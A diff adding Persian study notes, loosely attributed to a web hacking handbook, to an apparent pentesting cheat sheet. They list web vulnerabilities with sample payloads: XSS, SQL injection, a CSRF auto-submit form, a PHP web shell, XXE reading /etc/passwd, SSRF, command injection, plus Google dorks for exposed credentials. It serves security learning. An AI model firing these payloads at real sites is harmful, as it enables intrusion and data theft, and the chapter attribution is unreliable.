@@ -232,3 +232,355 @@ site:{domain} filetype:pdf “password” OR “credential” site:{domain} file
 site:{domain} “index of” “.git” site:{domain} “index of” “.env” site:{domain} “index of” “config”
 ```
 
+
+---
+
+### The Web Application Hacker’s Handbook
+
+فصل 1: Introduction to Web Hacking
+
+موضوع: مبانی امنیت وب، HTTP، مرورگرها، ساختار وب‌اپلیکیشن‌ها.
+
+نمونه آسیب‌پذیری: معمولاً هنوز چیزی نفوذپذیر نیست، اما فهم نحوه ارسال درخواست و پاسخ HTTP پایه است.
+
+روش کشف: با intercept کردن ترافیک HTTP/HTTPS از طریق Burp Suite یا OWASP ZAP.
+
+پیلود نمونه: -
+
+مثال: مشاهده درخواست ورود (POST) و پاسخ سرور هنگام نام کاربری/رمز اشتباه.
+
+فصل 2: Information Gathering
+
+موضوع: جمع‌آوری اطلاعات برای نفوذ: دامنه‌ها، سرورها، ورژن‌ها.
+
+نمونه آسیب‌پذیری: سرورهای قدیمی با CVE شناخته‌شده.
+
+روش کشف:
+```
+Subdomain enumeration: sublist3r, amass
+
+Banner grabbing: curl -I http://example.com
+```
+پیلود نمونه: -
+
+مثال: curl -I http://example.com جواب می‌دهد: Server: Apache/2.4.49 → CVE 2021-41773 (path traversal) قابل بررسی است.
+
+فصل 3: Mapping the Application
+
+موضوع: فهم صفحات و مسیرها، پارامترها، عملکرد.
+
+نمونه آسیب‌پذیری: صفحات مدیریت مخفی بدون احراز هویت.
+
+روش کشف: Crawling اتوماتیک با Burp Spider، یا ابزارهایی مثل gobuster.
+
+پیلود نمونه: -
+
+مثال: gobuster dir -u http://example.com -w common.txt → /admin پیدا می‌شود.
+
+فصل 4: Input Validation Vulnerabilities
+
+موضوع: XSS، SQLi، Command Injection.
+
+نمونه آسیب‌پذیری: Reflected XSS.
+
+روش کشف: دستکاری پارامترهای GET/POST.
+
+پیلود نمونه:
+```
+<script>alert('XSS')</script>
+```
+
+مثال: http://example.com/search?q=<script>alert('XSS')</script> → اگر هشدار نمایش داده شد، آسیب‌پذیر است.
+
+فصل 5: Broken Authentication
+
+موضوع: حملات login، session hijacking، brute force.
+
+نمونه آسیب‌پذیری: Credential stuffing.
+
+روش کشف: تست با ترکیب نام‌کاربری/رمز عبور از داده‌های افشا شده.
+
+پیلود نمونه: admin:admin123
+
+مثال: با Burp Intruder تست می‌کنیم و موفق به ورود غیرمجاز می‌شویم.
+
+فصل 6: Session Management
+
+موضوع: کوکی‌ها، توکن‌ها، Session Fixation.
+
+نمونه آسیب‌پذیری: Session ID قابل حدس.
+
+روش کشف: بررسی طول و الگوی Session ID.
+
+پیلود نمونه: تغییر آخرین کاراکتر Session ID در کوکی.
+
+مثال: PHPSESSID=abcd1234 → PHPSESSID=abcd1235 → اگر هنوز کار می‌کند، آسیب‌پذیر است.
+
+فصل 7: Access Control
+
+موضوع: IDOR، Privilege Escalation.
+
+نمونه آسیب‌پذیری: IDOR در تغییر پروفایل کاربر.
+
+روش کشف: تغییر شناسه کاربر در URL/پارامتر POST.
+
+پیلود نمونه:
+```
+GET /profile?user_id=123
+```
+
+→ تغییر به user_id=124
+
+مثال: اگر اطلاعات کاربر 124 نمایش داده شود، آسیب‌پذیر است.
+
+فصل 8: Injection Flaws
+
+موضوع: SQLi، Command Injection، LDAP Injection.
+
+نمونه آسیب‌پذیری: SQL Injection در فرم جستجو.
+
+روش کشف: تزریق کاراکتر ' و بررسی خطای SQL.
+
+پیلود نمونه:
+```
+' OR '1'='1
+```
+
+مثال: http://example.com/login?user=' OR '1'='1&pass=anything → ورود موفق.
+
+فصل 9: Cross-Site Scripting (XSS)
+
+موضوع: Stored, Reflected, DOM-based XSS.
+
+نمونه آسیب‌پذیری: Stored XSS در فرم کامنت.
+
+روش کشف: ثبت کامنت حاوی <script>alert(1)</script> و مشاهده آن توسط کاربر دیگر.
+
+پیلود نمونه: همان <script>alert(1)</script>
+
+مثال: ارسال کامنت → نمایش اسکریپت در صفحه.
+
+فصل 10: Cross-Site Request Forgery (CSRF)
+
+موضوع: حملات CSRF و جلوگیری.
+
+نمونه آسیب‌پذیری: انتقال پول بدون احراز هویت مجدد.
+
+روش کشف: ایجاد فرم HTML که درخواست POST را بدون توکن CSRF ارسال کند.
+
+پیلود نمونه:
+```
+<form action="http://example.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="to" value="attacker">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+مثال: اگر انتقال موفق باشد، آسیب‌پذیر است.
+
+
+فصل 11: File Handling Vulnerabilities
+
+موضوع: File upload، LFI، RFI، Path Traversal.
+
+نمونه آسیب‌پذیری: آپلود فایل مخرب بدون محدودیت.
+
+روش کشف: آپلود فایل PHP/Python و اجرای آن.
+
+پیلود نمونه:
+```
+<?php system($_GET['cmd']); ?>
+```
+
+مثال: آپلود shell.php → http://example.com/uploads/shell.php?cmd=ls → اگر محتوا نمایش داده شد، آسیب‌پذیر است.
+
+فصل 12: SQL Injection Advanced
+
+موضوع: Blind SQLi، Time-based، Error-based.
+
+نمونه آسیب‌پذیری: SQLi در فرم جستجو بدون نمایش خطا.
+
+روش کشف: تزریق دستوراتی که زمان پاسخ را تغییر دهند.
+
+پیلود نمونه:
+```
+' OR IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0) --
+```
+
+مثال: اگر پاسخ با ۵ ثانیه تاخیر آمد، SQL Injection تأیید می‌شود.
+
+فصل 13: XML External Entity (XXE)
+
+موضوع: آسیب‌پذیری XML/Parser.
+
+نمونه آسیب‌پذیری: دسترسی به فایل‌های سرور.
+
+روش کشف: تزریق XML با ENTITY خارجی.
+
+پیلود نمونه:
+```
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+```
+
+مثال: پاسخ سرور حاوی /etc/passwd → آسیب‌پذیر است.
+
+فصل 14: Server-Side Request Forgery (SSRF)
+
+موضوع: دسترسی سرور به منابع داخلی.
+
+نمونه آسیب‌پذیری: درخواست سرور به IP داخلی.
+
+روش کشف: تغییر URL در پارامتر که سرور درخواست می‌کند.
+
+پیلود نمونه:
+```
+http://example.com/fetch?url=http://127.0.0.1/admin
+```
+
+مثال: اگر محتوا بازگشت، SSRF تأیید شد.
+
+فصل 15: Command Injection
+
+موضوع: اجرای دستورات سیستم از وب.
+
+نمونه آسیب‌پذیری: فرم ping.
+
+روش کشف: تزریق کاراکترهای خط فرمان.
+
+پیلود نمونه:
+```
+; ls -la
+```
+
+مثال: http://example.com/ping?host=127.0.0.1; ls -la → لیست فایل‌ها برگشت.
+
+فصل 16: Insecure Direct Object References (IDOR)
+
+موضوع: دسترسی غیرمجاز به منابع.
+
+نمونه آسیب‌پذیری: تغییر user_id در URL.
+
+روش کشف: تغییر پارامترهای GET/POST.
+
+پیلود نمونه:
+```
+GET /invoice?id=101
+```
+
+مثال: تغییر به id=102 → اگر فاکتور دیگر کاربر نمایش داده شد، آسیب‌پذیر است.
+
+فصل 17: Cross-Site Script Inclusion (XSSI)
+
+موضوع: دسترسی به داده‌های حساسی که در جاوااسکریپت هستند.
+
+نمونه آسیب‌پذیری: اطلاعات در فایل JS.
+
+روش کشف: بررسی فایل‌های JS و تزریق script.
+
+پیلود نمونه: </script><script>alert(1)</script>
+
+مثال: اطلاعات محرمانه از JS خارج شد.
+
+فصل 18: Web Services Vulnerabilities
+
+موضوع: SOAP/REST API Security.
+
+نمونه آسیب‌پذیری: API بدون احراز هویت.
+
+روش کشف: تست endpoint ها با Postman.
+
+پیلود نمونه: GET /api/users/1 بدون توکن → اطلاعات کاربر بازگشت.
+
+مثال: API دسترسی آزاد به دیتابیس.
+
+فصل 19: Authentication and Authorization Flaws in APIs
+
+موضوع: JWT، OAuth، API key.
+
+نمونه آسیب‌پذیری: JWT بدون اعتبارسنجی signature.
+
+روش کشف: تغییر payload JWT.
+
+پیلود نمونه:
+```
+{"user":"admin"}
+```
+
+مثال: جایگزینی JWT → دسترسی admin بدون رمز عبور.
+
+فصل 20: Attacking Application Logic
+
+موضوع: خطاهای منطقی وب‌اپ.
+
+نمونه آسیب‌پذیری: دور زدن محدودیت‌های تراکنش.
+
+روش کشف: تکرار یا تغییر درخواست‌ها.
+
+پیلود نمونه: تغییر quantity=1 → quantity=100
+
+مثال: قیمت کاهش نیافت → Logic flaw.
+
+فصل 21: Security Misconfiguration
+
+موضوع: فایل‌های غیرقابل دسترسی، سرورهای باز.
+
+نمونه آسیب‌پذیری: فهرست دایرکتوری باز.
+
+روش کشف: دسترسی مستقیم به مسیرها.
+
+پیلود نمونه: http://example.com/uploads/
+
+مثال: مشاهده لیست فایل‌ها → آسیب‌پذیر است.
+
+فصل 22: Sensitive Data Exposure
+
+موضوع: افشای اطلاعات رمزگذاری نشده.
+
+نمونه آسیب‌پذیری: داده‌های حساس در HTTPS غیرفعال.
+
+روش کشف: مانیتور ترافیک HTTP.
+
+پیلود نمونه: -
+
+مثال: درخواست POST حاوی password=1234 در HTTP → آسیب‌پذیر است.
+
+فصل 23: Using Components with Known Vulnerabilities
+
+موضوع: کتابخانه‌ها و پکیج‌های آسیب‌پذیر.
+
+نمونه آسیب‌پذیری: Apache Struts با CVE شناخته شده.
+
+روش کشف: بررسی نسخه‌ها.
+
+پیلود نمونه: -
+
+مثال: نسخه آسیب‌پذیر در header: Server: Apache-Coyote/1.1 → Exploit موجود.
+
+فصل 24: Insufficient Logging & Monitoring
+
+موضوع: عدم گزارش‌دهی نفوذها.
+
+نمونه آسیب‌پذیری: نفوذ بدون ردپا.
+
+روش کشف: انجام تست و بررسی لاگ سرور.
+
+پیلود نمونه: -
+
+مثال: دسترسی غیرمجاز بدون هیچ log در سیستم → مشکل امنیتی.
+
+فصل 25: Web Application Security Testing
+
+موضوع: جمع‌بندی، تست کامل وب‌اپلیکیشن.
+
+نمونه آسیب‌پذیری: همه موارد بالا.
+
+روش کشف: اجرای تست ترکیبی با Burp Suite، OWASP ZAP، و اسکریپت‌های خودکار.
+
+پیلود نمونه: ترکیبی از XSS، SQLi، CSRF، IDOR.
+
+مثال: اجرای اسکن جامع → گزارش آسیب‌پذیری‌ها به شکل HTML/PDF.
+
+---
+
